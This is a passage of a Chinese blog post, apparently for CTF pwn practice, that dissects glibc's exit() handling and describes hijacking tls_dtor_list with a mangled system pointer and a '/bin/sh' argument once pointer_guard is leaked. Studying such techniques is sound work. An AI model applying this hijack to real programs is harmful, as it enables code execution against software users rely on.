        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>线程退出的时候，需要释放掉这个线程所占有的资源，并且停止内核和CPU对其的调度，才算是结束了这个线程。换句话说，线程退出需要用户层面和内核层面的共同工作。内核层面，glibc通过_exit()系统调用来终止线程，用户层面则通过exit()函数。在pwn中，系统调用很难被利用，我们通常重点关注exit函数。</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>exit.c中定义了<code>exit</code>函数和<code>__run_exit_handlers</code>函数，其中exit函数其实就是对__run_exit_handlers的封装：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到exit函数调用了__run_exit_handlers函数并以<code>__exit_funcs</code>等变量为参数。在查看核心函数之前，先来关注与其相关的数据结构。</p><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><p>我们追溯__exit_funcs，可以发现其在cxa_atexit.c中有定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> <span class="title">initial</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *__<span class="title">exit_funcs</span> =</span> &amp;initial;</span><br></pre></td></tr></table></figure><p>在exit.h中对<code>exit_function_list</code>结构体有定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ef_free, <span class="comment">/* `ef_free&#x27; MUST be zero!  */</span></span><br><span class="line">  ef_us,</span><br><span class="line">  ef_on,</span><br><span class="line">  ef_at,</span><br><span class="line">  ef_cxa</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">     this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*at)(<span class="type">void</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">void</span> (*fn)(<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">      <span class="type">void</span> *arg;</span><br><span class="line">    &#125; on;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">void</span> (*fn)(<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">      <span class="type">void</span> *arg;</span><br><span class="line">      <span class="type">void</span> *dso_handle;</span><br><span class="line">    &#125; cxa;</span><br><span class="line">  &#125; func;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="type">size_t</span> idx;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>exit执行时会进行一些析构工作，<code>exit_function</code>结构体是对单个析构函数的描述，其中<code>flavour</code>变量描述的是函数类型：</p><ul><li><code>ef_free</code>: 此位置空闲（没有析构函数）</li><li><code>ef_us</code>: 此位置函数使用中，但尚未写入函数指针，类型未知等待写入</li><li><code>ef_at</code>: 没有参数的函数</li><li><code>ef_on</code>: 先传入状态码再传入第二参数的函数</li><li><code>ef_cxa</code>: 先传入第一参数后状态码的函数</li></ul><p>因为单个函数只会有一种类型，所以使用了联合体。而<code>exit_function_list</code>是维护多个析构函数的单链表，idx储存的是函数个数。而<code>initial</code>变量则是exit的第一个析构函数链表，储存在libc的.data段，而往后的其他链表节点则是通过malloc分配的。</p><h3 id="run-exit-handlers"><a href="#run-exit-handlers" class="headerlink" title="__run_exit_handlers()"></a>__run_exit_handlers()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers(<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line"><span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>) </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (run_dtors)</span><br><span class="line">__call_tls_dtors(); <span class="comment">//首先释放tls</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">   the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">   everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">   exit (). */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) <span class="comment">//析构函数处理大循环</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span>;</span></span><br><span class="line"></span><br><span class="line">__libc_lock_lock(__exit_funcs_lock); <span class="comment">//给互斥锁上锁</span></span><br><span class="line"></span><br><span class="line">restart:</span><br><span class="line">cur = *listp; <span class="comment">//最开始的就是initial变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">   atexit/on_exit registrations.  */</span></span><br><span class="line">__exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">__libc_lock_unlock(__exit_funcs_lock); <span class="comment">//给互斥锁解锁</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">__libc_lock_unlock(__exit_funcs_lock);</span><br><span class="line"><span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> (*atfct)(<span class="type">void</span>);</span><br><span class="line"><span class="type">void</span> (*onfct)(<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line"><span class="type">void</span> (*cxafct)(<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> ef_free:</span><br><span class="line"><span class="keyword">case</span> ef_us:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ef_on:</span><br><span class="line">onfct = f-&gt;func.on.fn; <span class="comment">//绑定on类型的函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">PTR_DEMANGLE(onfct); <span class="comment">//用宏来解密函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">onfct(status, f-&gt;func.on.arg); <span class="comment">//执行相应析构函数</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ef_at:</span><br><span class="line">atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">PTR_DEMANGLE(atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">atfct();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ef_cxa:</span><br><span class="line"><span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment">   we must mark this function as ef_free.  */</span></span><br><span class="line">f-&gt;flavor = ef_free; <span class="comment">//为了防止条件竞争，执行过的cxa类型析构函数之后会被置free</span></span><br><span class="line">cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">PTR_DEMANGLE(cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">cxafct(f-&gt;func.cxa.arg, status);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Re-lock again before looking at global state.  */</span></span><br><span class="line">__libc_lock_lock(__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(new_exitfn_called != __new_exitfn_called))</span><br><span class="line"><span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">   more exit functions.  Start the loop over.  */</span></span><br><span class="line"><span class="keyword">goto</span> restart;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*listp = cur-&gt;next; <span class="comment">//切换到下一个节点</span></span><br><span class="line"><span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line"><span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">   allocate element.  */</span></span><br><span class="line"><span class="built_in">free</span>(cur); <span class="comment">//释放除了第一个以外的其他节点</span></span><br><span class="line"></span><br><span class="line">__libc_lock_unlock(__exit_funcs_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">RUN_HOOK(__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">_exit(status); <span class="comment">//系统调用，内核exit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>TLS</code>：Thread Local Storage，是一种数据的储存方式，作用是保持数据在线程内全局可访问，而不能被其他线程访问到。</p><p>__run_exit_handlers函数的大致流程就是，先进行两个条件判断，成立则调用__call_tls_dtors函数释放tls。我们来追踪一下这个函数（在cxa_thread_atexit_impl.c中）。</p><h3 id="call-tls-dtors"><a href="#call-tls-dtors" class="headerlink" title="__call_tls_dtors()"></a>__call_tls_dtors()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Call the destructors.  This is called either when a thread returns from the</span></span><br><span class="line"><span class="comment">   initial function or when the process exits via the exit function.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment"> l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment"> potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment"> l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>tls_dtor_list</code>不为空，则解密每个节点中的func函数指针，并以obj成员为参数执行。所以其实可以劫持tls_dtor_list写入system和binsh，前提是要泄露解密的key，这个后面再看。我们先来看tls_dtor_list的原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*dtor_func)</span> <span class="params">(<span class="type">void</span> *)</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">tls_dtor_list</span>;</span></span><br></pre></td></tr></table></figure><p>那么也就是如果有任意写的机会，可以往tls_dtor_list里写加密后的system地址到func和binsh地址到obj。顺带一提，这个攻击方法在2.35也适用。</p><p>但是一般做题的时候pwndbg并不能读取到tls_dtor_list的符号，所以只能通过其他途径来找到其所在处。我们将libc扔到ida查找一下这个函数，看看汇编层面这个函数是如何运行的。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000047280</span>                 public __call_tls_dtors</span><br><span class="line">.text:<span class="number">0000000000047280</span> __call_tls_dtors <span class="keyword">proc</span> near              ; <span class="type">CODE</span> <span class="type">XREF</span>: sub_467B0:loc_46A08↑p</span><br><span class="line">.text:<span class="number">0000000000047280</span>                                         ; <span class="type">DATA</span> <span class="type">XREF</span>: <span class="type">LOAD</span>:<span class="number">000000000000E420</span>↑o</span><br><span class="line">.text:<span class="number">0000000000047280</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000047280</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000047284</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000047285</span>                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000047286</span>                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:000000000004728A                 mov     rbx, cs:off_1EBD60</span><br><span class="line">.text:<span class="number">0000000000047291</span>                 mov     rbp, fs:[rbx]</span><br><span class="line">.text:<span class="number">0000000000047295</span>                 test    rbp, rbp</span><br><span class="line">.text:<span class="number">0000000000047298</span>                 jz      short loc_472DD</span><br><span class="line">.text:000000000004729A                 nop     word ptr [rax+rax+00h]</span><br><span class="line">.text:00000000000472A0</span><br><span class="line">.text:00000000000472A0 loc_472A0:                              ; <span class="type">CODE</span> <span class="type">XREF</span>: __call_tls_dtors+5B↓j</span><br><span class="line">.text:00000000000472A0                 mov     rdx, [rbp+18h]</span><br><span class="line">.text:00000000000472A4                 mov     rax, [rbp+<span class="number">0</span>]</span><br><span class="line">.text:00000000000472A8                 ror     rax, 11h</span><br><span class="line">.text:00000000000472AC                 xor     rax, fs:30h</span><br><span class="line">.text:00000000000472B5                 mov     fs:[rbx], rdx</span><br><span class="line">.text:00000000000472B9                 mov     rdi, [rbp+<span class="number">8</span>]</span><br><span class="line">.text:00000000000472BD                 call    rax</span><br><span class="line">.text:00000000000472BF                 mov     rax, [rbp+10h]</span><br><span class="line">.text:00000000000472C3                 lock sub qword ptr [rax+460h], <span class="number">1</span></span><br><span class="line">.text:00000000000472CC                 mov     rdi, rbp</span><br><span class="line">.text:00000000000472CF                 call    j_free</span><br><span class="line">.text:00000000000472D4                 mov     rbp, fs:[rbx]</span><br><span class="line">.text:00000000000472D8                 test    rbp, rbp</span><br><span class="line">.text:00000000000472DB                 jnz     short loc_472A0</span><br><span class="line">.text:00000000000472DD</span><br><span class="line">.text:00000000000472DD loc_472DD:                              ; <span class="type">CODE</span> <span class="type">XREF</span>: __call_tls_dtors+<span class="number">18</span>↑j</span><br><span class="line">.text:00000000000472DD                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000000472E1</span>                 pop     rbx</span><br><span class="line">.text:<span class="number">00000000000472E2</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">00000000000472E3</span>                 retn</span><br><span class="line">.text:<span class="number">00000000000472E3</span> ; &#125; // starts at <span class="number">47280</span></span><br><span class="line">.text:<span class="number">00000000000472E3</span> __call_tls_dtors endp</span><br></pre></td></tr></table></figure><p>第9行给rbx赋了一个地址，然后将fs+[rbx]赋给了rbp，此时rbp就指向tls_dtor_list。第11行的test就是在检查其是否为空。第17行，将func赋给rax，然后右循环位移17位，取fs+0x30的内容进行异或。这就完成了函数指针的解密操作。后面就是传入参数并执行了。</p><p>fs+0x30是个啥呢？fs是段寄存器，里面存放着GDT表的索引，linux会让fs指向当前线程的控制块，也就是<code>tcbhead_t</code>结构体，很多和线程相关的全局变量会储存在这个结构体当中，其定义在tls.h中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>pointer_guard就是我们要找的fs:0x30，而stack_guard就是常见的canary，也就是fs:0x28。在pwndbg中查找这个结构体地址的方法也很简单，可以通过符号搜索，也可以直接输入<code>tls</code>作为指令，就可以输出其地址了，计算一下偏移即可。</p><h3 id="PTR-DEMANGLE"><a href="#PTR-DEMANGLE" class="headerlink" title="PTR_DEMANGLE"></a>PTR_DEMANGLE</h3><p>顺便也来看一下PTR_DEMANGLE这个用来解密的宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var)asm (<span class="string">&quot;xor %%fs:%c2, %0\n&quot;</span>      \</span></span><br><span class="line"><span class="meta">     <span class="string">&quot;rol $2*&quot;</span> LP_SIZE <span class="string">&quot;+1, %0&quot;</span>      \</span></span><br><span class="line"><span class="meta">     : <span class="string">&quot;=r&quot;</span> (var)      \</span></span><br><span class="line"><span class="meta">     : <span class="string">&quot;0&quot;</span> (var),      \</span></span><br><span class="line"><span class="meta">       <span class="string">&quot;i&quot;</span> (offsetof (tcbhead_t,      \</span></span><br><span class="line"><span class="meta">      pointer_guard)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)asm (<span class="string">&quot;ror $2*&quot;</span> LP_SIZE <span class="string">&quot;+1, %0\n&quot;</span>      \</span></span><br><span class="line"><span class="meta">     <span class="string">&quot;xor %%fs:%c2, %0&quot;</span>      \</span></span><br><span class="line"><span class="meta">     : <span class="string">&quot;=r&quot;</span> (var)      \</span></span><br><span class="line"><span class="meta">     : <span class="string">&quot;0&quot;</span> (var),      \</span></span><br><span class="line"><span class="meta">       <span class="string">&quot;i&quot;</span> (offsetof (tcbhead_t,      \</span></span><br><span class="line"><span class="meta">      pointer_guard)))</span></span><br></pre></td></tr></table></figure><p>libc在x86_64&#x2F;sysdep.h中很简单粗暴地直接用汇编来写解密过程了，其中LP_SIZE定义为8。</p><h3 id="已存在的析构函数？"><a href="#已存在的析构函数？" class="headerlink" title="已存在的析构函数？"></a>已存在的析构函数？</h3><p>libc封装了一系列函数到<code>atexit()</code>函数，用来添加exit的析构函数，或者说，用来注册exit的析构函数。定义如下，但这里不展开叙述了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">atexit</span><span class="params">(<span class="type">void</span> (*func)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))func, <span class="literal">NULL</span>, &amp;__dso_handle == <span class="literal">NULL</span> ? <span class="literal">NULL</span> : __dso_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题在于，就算我们写程序的时候没有使用这个函数来添加析构函数，程序exit的时候也会执行一些析构函数。显然肯定是有谁注册了这些析构函数，并且是早在程序启动还没开始执行main时就注册完成了。</p><p>程序逆向得多了的话，应该不难发现每个elf文件都有个<code>_start()</code>函数，并且这个函数还占据.text段的第一个位置。显而易见，这个函数才是一个elf文件真正的入口。那么这个函数干了什么事呢？</p><h5 id="start"><a href="#start" class="headerlink" title="_start()"></a>_start()</h5><p>这个函数的源码在glibc中是以汇编的形式出现的，在sysdeps&#x2F;x86_64&#x2F;start.S中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 